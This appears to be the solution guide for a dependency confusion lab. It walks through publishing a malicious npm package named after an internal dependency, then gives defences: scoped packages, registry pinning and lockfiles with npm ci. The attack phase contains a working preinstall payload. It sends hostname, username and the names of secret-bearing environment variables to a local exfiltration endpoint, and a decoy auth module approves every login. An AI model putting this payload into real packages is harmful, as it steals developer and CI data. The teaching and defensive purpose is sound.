# Solution: Supply Chain Attack Lab

## Attack Walkthrough

### Phase 1: Reconnaissance

Inspect the target application to discover the internal package name and version constraint.

```bash
cat vulnerable-app/package.json
```

Key findings:
- The app depends on `acme-auth-utils` with version range `^1.0.0`.
- The package name is unscoped (no `@org/` prefix).
- The `.npmrc` points to the private registry at `http://localhost:4873`.

The `^1.0.0` constraint means npm accepts any version `>=1.0.0` and `<2.0.0` from the configured registry. However, if a higher major version appears on a fallback registry, npm may prefer it depending on resolution order.

### Phase 2: Weaponization

Craft a malicious version of `acme-auth-utils` with a preinstall hook that exfiltrates system data.

```bash
cd attacker-workspace
mkdir malicious-package && cd malicious-package
```

Create `package.json`:

```json
{
  "name": "acme-auth-utils",
  "version": "99.0.0",
  "description": "Totally legitimate auth utils",
  "main": "index.js",
  "scripts": {
    "preinstall": "node payload.js"
  }
}
```

Create `payload.js`:

```javascript
const http = require("http");
const os = require("os");

const data = JSON.stringify({
  hostname: os.hostname(),
  username: os.userInfo().username,
  platform: os.platform(),
  cwd: process.cwd(),
  nodeVersion: process.version,
  envKeys: Object.keys(process.env).filter(
    k => k.includes("KEY") || k.includes("SECRET") || k.includes("TOKEN")
  ),
  timestamp: new Date().toISOString()
});

const options = {
  hostname: "127.0.0.1",
  port: 3000,
  path: "/exfil",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(data)
  }
};

const req = http.request(options, () => {});
req.on("error", () => {});
req.write(data);
req.end();
```

Create `index.js` (decoy so the app doesn't crash after install):

```javascript
function authenticate(username, password) {
  return { success: true, user: username, token: "compromised" };
}
module.exports = { authenticate };
```

### Phase 3: Delivery

Publish the weaponized package to the public registry (port 4874).

```bash
npm publish --registry http://localhost:4874
```

Credentials if prompted: `attacker` / `attacker123`

### Phase 4: Execution

Trigger the dependency confusion in the vulnerable app. Open a new terminal and start the monitoring server first:

```bash
node monitoring-server/server.js
```

Then force the vulnerable app to resolve from the public registry by adding it as a fallback:

```bash
cd vulnerable-app
npm install --registry http://localhost:4874
```

The `preinstall` script fires before any code is installed. The payload POSTs system metadata to the monitoring server.

### Phase 5: Verification

Check the monitoring server terminal. You should see:

```
========================================
  DATA EXFILTRATED DURING npm install
========================================
  Hostname:     <your-kali-hostname>
  Username:     <your-username>
  ...
========================================

[FLAG] hostname=<your-kali-hostname>
[FLAG] username=<your-username>
```

You can also query captured data programmatically:

```bash
curl http://127.0.0.1:3000/captured
```

## Defender Track

Three defense strategies that prevent this attack at different layers.

### Defense 1: Scoped Packages

**Why it works:** Scoped packages (`@org/package-name`) create a namespace that cannot be squatted on the public registry by arbitrary users. When you pair a scope with registry pinning, the name resolves exclusively from your private registry.

**Before (vulnerable):**

```json
{
  "dependencies": {
    "acme-auth-utils": "^1.0.0"
  }
}
```

**After (defended):**

```json
{
  "dependencies": {
    "@acme/auth-utils": "^1.0.0"
  }
}
```

The scoped package lives at `defenses/scoped-auth-utils/`. To test:

```bash
cd defenses/defended-app
npm install --registry http://localhost:4873
```

The attack fails because `@acme/auth-utils` on the public registry (port 4874) does not exist. The scope locks resolution to the private registry.

### Defense 2: Registry Pinning via .npmrc

**Why it works:** An `.npmrc` file can bind an entire scope to a specific registry URL. Even if an attacker publishes `@acme/auth-utils` on a public registry, npm will never look there for `@acme` scoped packages.

**Before (vulnerable `.npmrc`):**

```ini
registry=http://localhost:4873
```

**After (defended `.npmrc`):**

```ini
@acme:registry=http://localhost:4873
registry=http://localhost:4874
```

This configuration says: resolve `@acme/*` packages exclusively from port 4873. Everything else can come from port 4874. The attacker cannot override the scope binding.

### Defense 3: Lockfile Integrity with npm ci

**Why it works:** When you commit a `package-lock.json`, it records the exact version, resolved URL, and SHA-512 integrity hash of every dependency. The `npm ci` command refuses to install anything that doesn't match the lockfile exactly.

**How to use:**

1. Install once with the correct registry to generate the lockfile:

```bash
npm install --registry http://localhost:4873
```

2. Commit `package-lock.json` to version control.

3. On all subsequent installs (CI/CD, other developers), use:

```bash
npm ci
```

If an attacker publishes v99.0.0, `npm ci` rejects it because the lockfile pins v1.0.0 with the hash from your private registry. The install fails with an integrity mismatch error.

### Summary Table

| Defense | Layer | Prevents |
|---------|-------|----------|
| Scoped packages | Naming | Name squatting on public registries |
| Registry pinning | Resolution | Fallback to untrusted registries |
| Lockfile integrity | Verification | Installing tampered or unexpected versions |
